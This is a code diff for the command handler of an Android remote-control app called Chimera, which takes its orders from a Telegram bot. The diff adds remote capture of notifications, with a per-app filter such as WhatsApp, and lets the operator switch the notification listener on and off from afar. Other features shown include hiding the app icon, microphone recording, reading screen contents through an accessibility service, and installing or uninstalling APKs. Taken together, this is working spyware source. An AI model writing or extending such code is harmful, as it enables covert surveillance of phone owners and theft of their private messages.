@@ -1,6 +1,7 @@
 package com.chimera;
 
 import android.accessibilityservice.AccessibilityService;
+import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
 import android.content.pm.ApplicationInfo;
@@ -24,12 +25,14 @@ import java.util.List;
 public class TelegramBotWorker implements Runnable {
     private final Context context;
     private long lastUpdateId = 0;
-    private enum WaitingState { NONE, FOR_PACKAGE_NAME_LAUNCH, FOR_PACKAGE_NAME_UNINSTALL, FOR_VOLUME, FOR_IMAGE_OVERLAY, FOR_AUDIO_PLAY, FOR_APK_INSTALL, FOR_LINK_OPEN }
+    private enum WaitingState { NONE, FOR_PACKAGE_NAME_LAUNCH, FOR_PACKAGE_NAME_UNINSTALL, FOR_VOLUME, FOR_IMAGE_OVERLAY, FOR_AUDIO_PLAY, FOR_APK_INSTALL, FOR_LINK_OPEN, FOR_NOTIFICATION_FILTER }
     private WaitingState currentState = WaitingState.NONE;
     private int customDuration = 0;
     private int customScale = 100;
+    private static String notificationFilterPackage = null;
 
     public TelegramBotWorker(Context ctx) { this.context = ctx.getApplicationContext(); }
+    public static String getNotificationFilter() { return notificationFilterPackage; }
 
     @Override
     public void run() {
@@ -85,29 +88,18 @@ public class TelegramBotWorker implements Runnable {
                     sendMessage("Usage Access settings opened. Please enable permission for the app.", context);
                     break;
                 case "/open_link":
-                    currentState = WaitingState.FOR_LINK_OPEN;
-                    sendMessage("Reply with the full URL to open (e.g., https://google.com)", context);
+                    if (parts.length > 1) openLink(parts[1]);
+                    else sendMessage("Usage: `/open_link <url>`", context);
                     break;
                 case "/show_image":
-                    customDuration = 10;
-                    customScale = 100;
-                    if (parts.length > 2) {
-                        try {
-                            customDuration = Integer.parseInt(parts[1]);
-                            customScale = Integer.parseInt(parts[2]);
-                        } catch (Exception ignored) {}
-                    }
+                    customDuration = 10; customScale = 100;
+                    if (parts.length > 2) { try { customDuration = Integer.parseInt(parts[1]); customScale = Integer.parseInt(parts[2]); } catch (Exception ignored) {} }
                     currentState = WaitingState.FOR_IMAGE_OVERLAY;
                     sendMessage("Ready for image file. It will be shown for " + customDuration + "s at " + customScale + "% scale.", context);
                     break;
                 case "/play_audio":
                     customDuration = -1;
-                    if (parts.length > 1) {
-                        if (!"full".equalsIgnoreCase(parts[1])) {
-                            try { customDuration = Integer.parseInt(parts[1]); }
-                            catch (NumberFormatException ignored) {}
-                        }
-                    }
+                    if (parts.length > 1) { if (!"full".equalsIgnoreCase(parts[1])) { try { customDuration = Integer.parseInt(parts[1]); } catch (NumberFormatException ignored) {} } }
                     currentState = WaitingState.FOR_AUDIO_PLAY;
                     String durationText = customDuration > 0 ? "for " + customDuration + " seconds." : "completely.";
                     sendMessage("Ready for audio file. It will be played " + durationText, context);
@@ -132,26 +124,13 @@ public class TelegramBotWorker implements Runnable {
 
     private boolean handleStatefulReply(String text) {
         WaitingState previousState = currentState;
-        if (previousState == WaitingState.NONE) {
-            return false;
-        }
-        
+        if (previousState == WaitingState.NONE) return false;
         currentState = WaitingState.NONE;
-
-        if (previousState == WaitingState.FOR_PACKAGE_NAME_LAUNCH) {
-            launchApp(text);
-            return true;
-        } else if (previousState == WaitingState.FOR_PACKAGE_NAME_UNINSTALL) {
-            uninstallApp(text);
-            return true;
-        } else if (previousState == WaitingState.FOR_VOLUME) {
-            setVolume(text);
-            return true;
-        } else if (previousState == WaitingState.FOR_LINK_OPEN) {
-            openLink(text);
-            return true;
-        }
-
+        if (previousState == WaitingState.FOR_PACKAGE_NAME_LAUNCH) { launchApp(text); return true; }
+        if (previousState == WaitingState.FOR_PACKAGE_NAME_UNINSTALL) { uninstallApp(text); return true; }
+        if (previousState == WaitingState.FOR_VOLUME) { setVolume(text); return true; }
+        if (previousState == WaitingState.FOR_LINK_OPEN) { openLink(text); return true; }
+        if (previousState == WaitingState.FOR_NOTIFICATION_FILTER) { setNotificationFilter(text); return true; }
         currentState = previousState;
         return false;
     }
@@ -161,39 +140,22 @@ public class TelegramBotWorker implements Runnable {
         currentState = WaitingState.NONE;
         try {
             String fileId = "", fileName = "tempfile";
-            if (msg.has("document")) {
-                fileId = msg.getJSONObject("document").getString("file_id");
-                fileName = msg.getJSONObject("document").getString("file_name");
-            } else if (msg.has("photo")) {
-                JSONArray photoSizes = msg.getJSONArray("photo");
-                fileId = photoSizes.getJSONObject(photoSizes.length() - 1).getString("file_id");
-                fileName = fileId + ".jpg";
-            } else if (msg.has("audio")) {
-                fileId = msg.getJSONObject("audio").getString("file_id");
-                fileName = msg.getJSONObject("audio").optString("file_name", fileId + ".mp3");
-            }
+            if (msg.has("document")) { fileId = msg.getJSONObject("document").getString("file_id"); fileName = msg.getJSONObject("document").getString("file_name");
+            } else if (msg.has("photo")) { JSONArray p = msg.getJSONArray("photo"); fileId = p.getJSONObject(p.length() - 1).getString("file_id"); fileName = fileId + ".jpg";
+            } else if (msg.has("audio")) { fileId = msg.getJSONObject("audio").getString("file_id"); fileName = msg.getJSONObject("audio").optString("file_name", fileId + ".mp3"); }
             switch (previousState) {
                 case FOR_IMAGE_OVERLAY:
                     downloadFile(fileId, fileName, path -> {
-                        Intent intent = new Intent(context, OverlayService.class);
-                        intent.setAction("ACTION_SHOW_IMAGE");
-                        intent.putExtra("imagePath", path);
-                        intent.putExtra("duration", customDuration);
-                        intent.putExtra("scale", customScale);
-                        context.startService(intent);
-                        sendMessage("Displaying image overlay...", context);
-                    });
-                    break;
+                        Intent i = new Intent(context, OverlayService.class); i.setAction("ACTION_SHOW_IMAGE");
+                        i.putExtra("imagePath", path); i.putExtra("duration", customDuration); i.putExtra("scale", customScale);
+                        context.startService(i); sendMessage("Displaying image overlay...", context);
+                    }); break;
                 case FOR_AUDIO_PLAY:
                     downloadFile(fileId, fileName, path -> {
-                        Intent intent = new Intent(context, AudioPlaybackService.class);
-                        intent.setAction("ACTION_PLAY_AUDIO");
-                        intent.putExtra("audioPath", path);
-                        intent.putExtra("duration", customDuration);
-                        context.startService(intent);
-                        sendMessage("Playing remote audio...", context);
-                    });
-                    break;
+                        Intent i = new Intent(context, AudioPlaybackService.class); i.setAction("ACTION_PLAY_AUDIO");
+                        i.putExtra("audioPath", path); i.putExtra("duration", customDuration);
+                        context.startService(i); sendMessage("Playing remote audio...", context);
+                    }); break;
                 case FOR_APK_INSTALL:
                     if (fileName.toLowerCase().endsWith(".apk")) { downloadFile(fileId, fileName, this::installApp); } 
                     else { sendMessage("Error: The uploaded file is not an APK.", context); }
@@ -208,15 +170,19 @@ public class TelegramBotWorker implements Runnable {
             String data = cb.getString("data");
             long chatId = cb.getJSONObject("message").getJSONObject("chat").getLong("id");
             int messageId = cb.getJSONObject("message").getInt("message_id");
-            if (!ChimeraAccessibilityService.isServiceEnabled() && (data.startsWith("ACC_") || data.equals("BACK_TO_MAIN"))) { sendMessage("⚠️ Action Failed: Accessibility Service is not enabled.", context); return; }
-            if (!NotificationListener.isServiceEnabled() && data.startsWith("NOTIF_")) { sendMessage("⚠️ Action Failed: Notification Listener service is not enabled.", context); return; }
+            if (!ChimeraAccessibilityService.isServiceEnabled() && (data.startsWith("ACC_") || data.equals("BACK_TO_GESTURES"))) { sendMessage("⚠️ Action Failed: Accessibility Service is not enabled.", context); return; }
             switch (data) {
                 case "LIST_APPS": listAllApps(); break;
                 case "LAUNCH_APP": currentState = WaitingState.FOR_PACKAGE_NAME_LAUNCH; sendMessage("Reply with the package name to launch.", context); break;
                 case "UNINSTALL_APP": currentState = WaitingState.FOR_PACKAGE_NAME_UNINSTALL; sendMessage("Reply with the package name to uninstall.", context); break;
                 case "SET_VOLUME": currentState = WaitingState.FOR_VOLUME; sendMessage("Reply with a volume level from 0 to 100.", context); break;
                 case "INSTALL_APP": currentState = WaitingState.FOR_APK_INSTALL; sendMessage("Upload the APK file to install.", context); break;
-                case "NOTIF_GET_EXISTING": NotificationListener.getActiveNotifications(context); break;
+                case "NOTIFICATIONS_PANEL": sendNotificationPanel(chatId, messageId); break;
+                case "NOTIF_GET_EXISTING": context.sendBroadcast(new Intent("com.chimera.GET_ACTIVE_NOTIFICATIONS")); break;
+                case "NOTIF_SET_FILTER": currentState = WaitingState.FOR_NOTIFICATION_FILTER; sendMessage("Reply with the package name to filter notifications for (e.g., com.whatsapp).", context); break;
+                case "NOTIF_CLEAR_FILTER": setNotificationFilter(null); break;
+                case "NOTIF_ENABLE": setNotificationListenerState(true); break;
+                case "NOTIF_DISABLE": setNotificationListenerState(false); break;
                 case "ACC_GET_CONTENT": sendMessage(ChimeraAccessibilityService.getScreenContent(), context); break;
                 case "ACC_GESTURES": sendGesturePanel(chatId, messageId); break;
                 case "ACC_ACTION_BACK": ChimeraAccessibilityService.triggerGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK); break;
@@ -244,24 +210,16 @@ public class TelegramBotWorker implements Runnable {
             if (!url.startsWith("http")) url = "http://" + url;
             Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
             intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-            intent.setPackage("com.android.chrome");
             context.startActivity(intent);
-            sendMessage("Opening link in Chrome: " + url, context);
-        } catch (Exception e) {
-            sendMessage("Failed to open link in Chrome. Trying default browser...", context);
-            try {
-                Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
-                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-                context.startActivity(intent);
-            } catch (Exception e2) { sendMessage("Failed to open link in any browser.", context); }
-        }
+            sendMessage("Opening link: " + url, context);
+        } catch (Exception e) { sendMessage("Failed to open link.", context); }
     }
 
     private void uninstallApp(String packageName) {
         Intent intent = new Intent(Intent.ACTION_DELETE, Uri.parse("package:" + packageName));
         intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
         context.startActivity(intent);
-        sendMessage("Uninstall requested for " + packageName + ". User confirmation may be required.", context);
+        sendMessage("Uninstall requested for " + packageName + ".", context);
     }
     
     private void installApp(String apkPath) {
@@ -271,7 +229,7 @@ public class TelegramBotWorker implements Runnable {
         intent.setDataAndType(Uri.fromFile(apkFile), "application/vnd.android.package-archive");
         intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_GRANT_READ_URI_PERMISSION);
         context.startActivity(intent);
-        sendMessage("Install requested for " + apkFile.getName() + ". User confirmation is required.", context);
+        sendMessage("Install requested for " + apkFile.getName() + ".", context);
     }
 
     private void setVolume(String levelStr) {
@@ -279,6 +237,27 @@ public class TelegramBotWorker implements Runnable {
             DeviceControlHandler.setMediaVolume(context, Integer.parseInt(levelStr));
             sendMessage("Media volume set to " + levelStr + "%.", context);
         } catch (NumberFormatException e) { sendMessage("Error: Invalid number provided.", context); }
+    }
+    
+    private void setNotificationFilter(String packageName) {
+        notificationFilterPackage = packageName;
+        if (packageName == null || packageName.isEmpty()) {
+            sendMessage("Notification filter cleared. Capturing from all apps.", context);
+        } else {
+            sendMessage("Notification filter set. Only capturing from: `" + packageName + "`", context);
+        }
+    }
+    
+    private void setNotificationListenerState(boolean enable) {
+        try {
+            PackageManager pm = context.getPackageManager();
+            ComponentName componentName = new ComponentName(context, NotificationListener.class);
+            int state = enable ? PackageManager.COMPONENT_ENABLED_STATE_ENABLED : PackageManager.COMPONENT_ENABLED_STATE_DISABLED;
+            pm.setComponentEnabledSetting(componentName, state, PackageManager.DONT_KILL_APP);
+            sendMessage("Notification Listener service has been " + (enable ? "ENABLED" : "DISABLED") + ".", context);
+        } catch (Exception e) {
+            sendMessage("Failed to change Notification Listener state.", context);
+        }
     }
     
     private void listAllApps() {
@@ -302,10 +281,9 @@ public class TelegramBotWorker implements Runnable {
                 + "`/control` - Show the main control panel.\n"
                 + "`/mic <seconds>` - Record audio.\n"
                 + "`/device_details` - Get device intel report.\n"
-                + "`/toggle_app_hide` - Hide app icon.\n"
-                + "`/toggle_app_show` - Show app icon.\n"
+                + "`/toggle_app_hide` | `_show` - Toggle icon.\n"
                 + "`/grant_usage_access` - Open Usage Access settings.\n"
-                + "`/open_link <url>` - Open a link in Chrome.\n"
+                + "`/open_link <url>` - Open a link.\n"
                 + "`/show_image [dur] [scale]` - Prompt for image upload.\n"
                 + "`/play_audio [dur|full]` - Prompt for audio upload.\n"
                 + "`/help` - Show this message.", context);
@@ -317,12 +295,25 @@ public class TelegramBotWorker implements Runnable {
             JSONArray rows = new JSONArray();
             rows.put(new JSONArray().put(new JSONObject().put("text", "List Apps").put("callback_data", "LIST_APPS")).put(new JSONObject().put("text", "Launch App").put("callback_data", "LAUNCH_APP")).put(new JSONObject().put("text", "Uninstall App").put("callback_data", "UNINSTALL_APP")));
             rows.put(new JSONArray().put(new JSONObject().put("text", "Install App (APK)").put("callback_data", "INSTALL_APP")).put(new JSONObject().put("text", "Set Volume").put("callback_data", "SET_VOLUME")));
-            rows.put(new JSONArray().put(new JSONObject().put("text", "Get Screen Content").put("callback_data", "ACC_GET_CONTENT")).put(new JSONObject().put("text", "Get Active Notifications").put("callback_data", "NOTIF_GET_EXISTING")));
-            rows.put(new JSONArray().put(new JSONObject().put("text", "Gestures (Back/Home)").put("callback_data", "ACC_GESTURES")));
+            rows.put(new JSONArray().put(new JSONObject().put("text", "Notifications").put("callback_data", "NOTIFICATIONS_PANEL")).put(new JSONObject().put("text", "Gestures").put("callback_data", "ACC_GESTURES")));
+            rows.put(new JSONArray().put(new JSONObject().put("text", "Get Screen Content").put("callback_data", "ACC_GET_CONTENT")));
             rows.put(new JSONArray().put(new JSONObject().put("text", "❌ Exit Panel ❌").put("callback_data", "EXIT_PANEL")));
             keyboard.put("inline_keyboard", rows);
             sendMessageWithMarkup("`Chimera Control Panel`", keyboard);
         } catch (Exception e) { ErrorLogger.logError(context, "SendControlPanel", e); }
+    }
+    
+    private void sendNotificationPanel(long chatId, int messageId) {
+        try {
+            JSONObject keyboard = new JSONObject();
+            JSONArray rows = new JSONArray();
+            rows.put(new JSONArray().put(new JSONObject().put("text", "Read Active Notifications").put("callback_data", "NOTIF_GET_EXISTING")));
+            rows.put(new JSONArray().put(new JSONObject().put("text", "Set App Filter").put("callback_data", "NOTIF_SET_FILTER")).put(new JSONObject().put("text", "Clear App Filter").put("callback_data", "NOTIF_CLEAR_FILTER")));
+            rows.put(new JSONArray().put(new JSONObject().put("text", "Enable Service").put("callback_data", "NOTIF_ENABLE")).put(new JSONObject().put("text", "Disable Service").put("callback_data", "NOTIF_DISABLE")));
+            rows.put(new JSONArray().put(new JSONObject().put("text", "« Back to Main Panel").put("callback_data", "BACK_TO_MAIN")));
+            keyboard.put("inline_keyboard", rows);
+            editMessageMarkup(chatId, messageId, "`Notification Control`", keyboard);
+        } catch (Exception e) { ErrorLogger.logError(context, "SendNotifPanel", e); }
     }
 
     private void sendGesturePanel(long chatId, int messageId) {
@@ -398,10 +389,9 @@ public class TelegramBotWorker implements Runnable {
     
     public static void post(String method, JSONObject json, Context context) {
         new Thread(() -> {
-            HttpURLConnection conn = null;
             try {
                 URL url = new URL("https://api.telegram.org/bot" + ConfigLoader.getBotToken() + "/" + method);
-                conn = (HttpURLConnection) url.openConnection();
+                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                 conn.setRequestMethod("POST");
                 conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
                 conn.setDoOutput(true);
